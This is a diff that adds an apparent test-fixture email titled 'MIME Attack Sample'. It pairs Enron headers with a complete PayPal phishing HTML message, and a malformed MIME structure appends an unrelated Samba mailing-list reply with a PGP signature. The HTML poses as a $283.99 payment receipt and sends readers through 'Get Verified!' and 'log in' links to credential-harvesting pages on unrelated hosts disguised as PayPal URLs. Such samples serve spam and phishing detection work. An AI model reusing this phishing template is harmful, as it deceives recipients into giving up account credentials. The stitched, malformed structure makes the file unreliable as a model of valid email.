@@ -1,0 +1,190 @@
+From: tomdutta@hotmail.com
+To: mary.franklin@enron.com, gloria.barkowsky@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/plain
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20080720192912.3DC7B1C000BA@mwinf2101.orange.fr>
+To: undisclosed-recipients:;
+Content-Length: 11233
+Lines: 120
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 820
+
+<div id=message>
+
+
+<!-- type = text -->
+
+
+<html><head><title>Hello</title></head><xbody><style type="text/css">#message, #message TD {font-family: verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+
+#message LI {line-height: 120%;}
+#message UL.smallBorder {margin:10px 5px 10px 20px;}
+#message LI.smallBorderLi {margin:0px 0px 5px 0px;}
+#message UL.Narrow {margin:10px 5px 0px 40px;}
+#message HR.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+#message .smallEmphasis {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color: #000000;}
+#message .serifBig {font-family: serif;font-size: 20px;font-weight: bold;color: #000000;}
+#message .serif{font-family: serif;font-size: 16px;color: #000000;}
+#message .sansSerif{font-family: verdana,arial,helvetica,sans-serif; font-size: 16px;color: #000000;}
+#message .heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: bold;color: #003366;}
+#message .subHeadingEoa {font-family: verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color: #000000;}
+#message .subHeading {font-family: verdana,arial,helvetica,sans-serif;font-size: 16px;font-weight: bold;color: #003366;}
+#message .sidebarText {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #003366;}
+#message .sidebarTextBold {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color: #003366;}
+#message .xptFooter {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #aaaaaa;}
+#message .button {font-size: 13px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset; color:#000000; background-color: #cccccc;}
+#message .smaller {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #000000;}
+#message .smallerSidebar {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+#message .emphasis {font-weight: 700;}
+#message table#invoice, #message table#invoice_controls, #message table#invoice_note {        width: 600px;}
+#message table#invoice_note {margin-top:10px; margin-bottom:10px;}
+#message table#invoice_controls {text-align: right;}
+#message table#invoice {border-collapse: collapse; border:1px solid #aaa; }
+#message table#invoice td {font-size:11px; border:1px solid #ccc;        padding:2px;}
+#message table#invoice td.field_label_right, #message table#invoice td.field_label_right_error {font-weight:bold;        text-align:right;}
+#message table#invoice td.field_label_right_error, #message table#invoice td.field_label_error {color:red;}
+#message table#invoice tr.title td {font-weight:bold; line-height:20px; text-align:left; background-color: #ccddee;}
+#message table#invoice input.readonly {border:0; text-align:right;}
+#message table#invoice input.readonly_currency {border:0; width:10px;}
+#message .field_error, #message .field_error input.readonly_currency {background-color:#FF3333;}
+#message .currency_highlight {background-color: #ffffcc;}
+#message .tax {font-weight: 400; float: left;}
+#message table#invoice td span.curr {float: left;}
+#message table#invoice td.currency {border-right:1px solid #fff;}
+#message table#invoice td.calc {font-weight:bold; text-align:right;}
+#message .inlineBlue {color: #00f;}
+#message .small {font-size: 11px; font-weight: 400;}
+#message HR.solid {width: 100%; margin-top: 5px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px solid #999;}
+#message .large {font-size: 17px;} 
+#message .smallVerdanaGrey{font-family: verdana; font-size: 10px; color: #999999;} 
+#message .smallVerdana {font-family: verdana; font-size: 10px; color :#000000;} 
+#message .smallArial {font-family: arial; font-size: 13px; } 
+#message .smallArialBlue {font-family: verdana; font-size: 9px; color: #0000FF;} 
+#message .smallVerdanaGreen{font-family: verdana; font-size: 10px; color: #666666;} 
+#message .smaller {font-size: 10px; color: gray;} 
+#message .larger {font-size: 18px; font-family: arial; font-weight: 600; }  
+#message .longTableValue{word-break:break-all;} 
+#message .longSideBarText{word-break: normal;} 
+#message .geCompliantName{font-family: verdana,arial,helvetica,sans-serif;font-size: 12px;font-weight: normal; color: #003366;} 
+</style>
+
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr valign="top">
+<td><a target="_blank"  href="http://www.shankaraeu.com/tmp/PayPalISAPI.dll.SignIn.co.partnerId.pUserId.site0.pageType.bshowgif.UsingSSL.http.www.paypal.com.pp.pa2.errmsg.runame.ruparams.ruproduct.sid.favoritenav.confirm.ebxPageType.existingEmail.isCheckout.mig.php" >
+<img src="http://images.paypal.com/en_US/i/logo/email_logo.gif"  border="0" alt="PayPal"/></a></td></tr></table><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td background="http://images.paypal.com/en_US/i/scr/bg_clk.gif"  width="100%"><img alt="" border="0" height="29"
+src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1"/></td></tr>
+
+<tr><td><img alt="" border="0" height="10" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1"/></td></tr></table><table
+align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr><td/>
+</tr></table><table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr valign="top"><td width="100%">Dear valued member,<br/>
+<br/>This email confirms that you have paid lcdmonitorsppdsales@yahoo.com $283.99 USD using PayPal.<br/>
+<br/>This credit card transaction will appear on your bill as "PAYPAL *LCD03PPD4".<br/><br/><hr class="dotted"/>
+<br/><p class="subHeading">Payment Details</p><br/><table align="justify" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="3">
+<span class="emphasis">Purchased From:</span>
+<img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1" height="1"/>lcdmonitorsppd</td></tr></table>
+<br/><table align="justify" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-bottom: solid 1px #ccc; border-right: solid 1px #ccc; border-left: solid 1px #ccc;"><tr><td><table align="center" border="0" cellpadding="2" cellspacing="0" width="100%"><tr bgcolor="#e2e0e0"><td class="longTabl_eValue" width="25%"><span class="emphasis">Item #</span></td><td class="longTabl_eValue" width="45%">
+<span class="emphasis">Item Title</span></td><td align="center" width="10%">
+<span class="emphasis">Quantity</span></td><td align="center" class="longTabl_eValue" width="10%">
+<span class="emphasis">Price</span></td><td align="right" class="longTabl_eValue" nowrap="true" width="10%">
+<span class="emphasis"><span class="emphasis">Subtotal</span></span></td></tr><tr bgcolor="#ffffff"><td class="longTabl_eValue" valign="top" width="25%">50071920476</td>
+<td class="longTabl_eValue" valign="top" width="45%">
+<font color="003399">24" BRAVIA S-Series LCD HDTVKDL-32S2000</font></td><td align="center" valign="top" width="10%">1</td><td align="center" valign="top" width="10%">$283.99 USD</td>
+<td align="right" valign="top" width="10%">$283.99 USD</td></tr></table></td></tr></table><br/><table align="justify" border="0" cellpadding="3" cellspacing="0" width="100%"><tr valign="top"><td align="right" width="85%">Shipping &amp; Handling via USPS Priority Mail to (on file)<br/><span class="small">(includes any seller handling fees)</span>
+</td><td align="right">$11.00 USD</td></tr><tr valign="top"><td align="right"
+width="85%">Shipping Insurance (not offered):</td><td align="right">--</td></tr>
+<tr><td align="right" colspan="2" height="10" valign="top">
+<img height="1" width="125" src="http://images.paypal.com/en_US/i/scr/greyline.gif"  border="0" alt=""/>
+</td></tr><tr><td align="right"><span class="emphasis">Total:</span></td><td align="right" width="14%">$294.99 USD</td></tr></table><br/><br/><br/><br/><hr class="dotted"/>
+<br/><br/><br/><p class="subHeading">Shipping Information</p><br/><table align="justify" border="0" cellpadding="0" cellspacing="0"
+width="400">
+
+<tr valign="top"><td align="right" class="smallEmphasis" width="30%">Shipping Info:</td>
+<td width="5%">
+<img height="1" width="5" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  border="0"
+alt=""/>
+
+</td><td width="65%">Confirmed<img src="http://images.paypal.com/en_US/i/scr/scr_symQuestion.gif"  border="0" alt=""/>
+<br/></td></tr><tr valign="top"><td align="right" class="smallEmphasis" width="110">Address Status:</td><td>
+<img height="1" width="5" src="http://imagespaypal.com/en_US/i/scr/pixel.gif"  border="0" alt=""/></td>
+
+<td>Confirmed<a target="_blank"  href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/pop/confirmed_address_checkout-outside" >
+
+<img src="http://images.paypal.com/en_US/i/scr/scr_symQuestion.gif"  border="0" alt=""/></a> </td>
+</tr></table><hr class="dotted"/>
+<br/>If you did not purchase this item, or want to cancel the payment <br>please <b>Get Verified</b>
+
+ in just one step.<br><br/><hr class="dotted"/><br/><p class="subHeading">Get Verified    Your Key to More Security and Free Features
+<img alt="" border="0" height="10" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1"/>
+</p><p>Get Verified and help increase the security of your PayPal transactions for yourself and for everyone with whom you do business.
+</p><table align="center" bgcolor="#CCCC33" border="0" cellpadding="0" cellspacing="0"><tr>
+<td><table align="center" bgcolor="#FFFFCC" border="0" cellpadding="8" cellspacing="0"><tr>
+<td class="large">
+<img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1" height="1"/>
+<a target="_blank"  href="http://jaroud.ns8-wistee.fr/cgi-bin/security/update-paypal/service-peyment/update/login.aspx/webscrcmd/files/paypal-security/"><span class="emphasis">Get Verified!</span>
+</a><img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1" height="1"/>
+</td></tr></table></td></tr></table><img alt="" border="0" height="10" src="http://images.paypal.com/en_US/i/scr/pixel.gif"  width="1"/>
+<br/>Thank you for using PayPal!<br/>The PayPal Team
+<br/><br/><br/><p
+class="xptFooter">Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, 
+<a target="_blank"  href="http://www.shankaraeu.com/tmp/PayPalISAPI.dll.SignIn.co.partnerId.pUserId.site0.pageType.bshowgif.UsingSSL.http.www.paypal.com.pp.pa2.errmsg.runame.ruparams.ruproduct.sid.favoritenav.confirm.ebxPageType.existingEmail.isCheckout.mig.php" >log in</a> 
+to your PayPal account and choose the Help link located in the top right corner of any PayPal page.<br/><br class="h10"/>To receive email notifications in plain text instead of HTML, update your preferences
+ <a target="_blank"  href="http://www.winchester.com.pl/docs/PayPalISAPI.dll.SignIn.co.partnerId.pUserId.site0.pageType.bshowgif.UsingSSL.http.www.paypal.com.pp.pa2.errmsg.runame.ruparams.ruproduct.sid.favoritenav.confirm.ebxPageType.existingEmail.isCheckout.mig.php" >here</a>.</p>
+<br/><br/><span class="xptFooter"/><br/><span class="xptFooter">PayPal Email ID PP843</span></td></tr></table></xbody></html>
+--DELIMITER
+Content-Disposition: attachment; filename=signature.asc
+Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature" 
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+James Peach wrote:
+> On May 30, 2007, at 4:06 PM, jerry@samba.org wrote:
+> 
+>> Author: jerry
+>> Date: 2007-05-30 23:06:48 +0000 (Wed, 30 May 2007)
+>> New Revision: 23256
+>>
+>> WebSVN:
+>> http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba&rev=23256
+>>
+>> Log:
+>> fix length and siglen checks in pac_io_pac_signature_data()
+>> Modified:
+>>   branches/SAMBA_3_0_26/source/libads/authdata.c
+> 
+> Shouldn't this be in SAMBA_3_0 as well?
+
+It got accidentally checked in a previous commit.  See svn r23251.
+
+
+
+
+
+
+cheers, jerry
+
+--BOUNDARY
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGXjlzIR7qMdg1EfYRArpMAJ9VLpvLJjUEMKqwUAiEd5GlI2JgYgCeIvqp
+q3Az3+JlDHbM9wZpZgTI/AQ=
+=JWHn
+-----END PGP SIGNATURE-----
+
+
+-BOUNDARY--
+--DELIMITER--
